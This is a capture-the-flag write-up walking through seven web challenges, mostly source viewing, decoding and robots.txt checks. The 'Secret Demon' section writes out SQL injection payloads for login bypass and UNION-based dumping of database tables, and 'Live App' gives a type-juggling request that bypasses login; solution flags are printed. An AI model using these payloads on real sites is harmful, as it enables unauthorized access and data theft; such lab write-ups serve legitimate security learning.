## Challenges
1. Lorem lpsum
2. My First Website
3. My Second Website
4. Consoling
5. Takeover
6. Secret Deomn
7. Live App

## Lorem Ipsum
![](./Lorem%20Ipsum/challenge.png)

o	Step 1 : Go to the link
![](./Lorem%20Ipsum/1.png)

o	Step 2: view the source to find the flag
![](./Lorem%20Ipsum/2.png)


## My First Website
![](./My%20First%20Website/challenge.png)

•	My First Website

o	Step 1: Go to the link
![](./My%20First%20Website/1.png)

o	Step 2: Inspect element, there is a base 64 encoded string in the alt field
![](./My%20First%20Website/2.png)

o	Step 3: base 64 decode and convert from hex to get the flag
![](./My%20First%20Website/3.png)


## My Second Website
![](./My%20Second%20Website/challenge.png)

o	Step 1: Go to the link
![](./My%20Second%20Website/1.png)

o	Step 2: add robots.txt behind the url
![](./My%20Second%20Website/2.png)

o	Step 3: Go to the html page
![](./My%20Second%20Website/3.png)


## Consoling

![](./Consoling/challenge.png)

o	Step 1: Go to the link

![](./Consoling/1.png)

o	Step 2: looking at the source, there is 3 different html pages
![](./Consoling/2.png)

o	Step 3: going to the realflag.html page
![](./Consoling/3.png)

o	Step 4: viewing the source, it says totry listfunctions()
![](./Consoling/4.png)

o	Step 5: try list functions in the console
![](./Consoling/5.png)

o	Step 6: run the get flag and get key function to get the flag
![](./Consoling/6.png)



## Takeover
![](./Takeover/challenge.png)

o	Step 1: Go to the link

![](./Takeover/1.png)


o	Step 2: Go to robots.txt

![](./Takeover/2.png)


o	Step 3: Going to the flag.html page, 

![](./Takeover/3.png)


o	Step 4: search for the } as there are many strings which start with NYP{

![](./Takeover/4.1.png)

![](./Takeover/4.2.png)

![](./Takeover/4.3.png)

## Secret Demon
```
This was solved after the CTF
```
![](./Secret%20Demon/challenge.png)


o	Step 1: use the payload below as the username and any character in the password field to login
```
admin' or 1=1 #
```
![](./Secret%20Demon/before_login.png)
![](./Secret%20Demon/logged%20in.png)


o	Step 2: use the payload below in the search field to list all the tables in the database
```
'UNION SELECT table_schema, table_name, 1 From information_schema.tables#
```
![](./Secret%20Demon/tables.png)
![](./Secret%20Demon/sec_chal_table.png)


o	Step 3: use the payload below in the search field to list the columns in security_challenge.oni_xyza table
```
' UNION SELECT table_name, column_name, 1 FROM information_schema.columns where table_name = 'oni_xyza'#
```
![](./Secret%20Demon/column.png)


o	Step 4: use the payload below in the search field to list the secret column in the oni_xyza table to get the flag
```
'UNION SELECT NULL, NULL, secret From security_challenge.oni_xyza #
```
![](./Secret%20Demon/flag.png)

```
flag: NYP{T4mAy0_i5_Qu33N}
```

## Live App
```
This was solved after the CTF
```
![](./Live%20App/challenge.png)

o Step 1: Use Burp to Intercept a post request


o Step 2: add a [] in front of the username and password and send the request to get the flag

```
username[]=&password[]=&login=Login
```
![](./Live%20App/flag.png)

```
flag: NYP{type_juggling!}
```
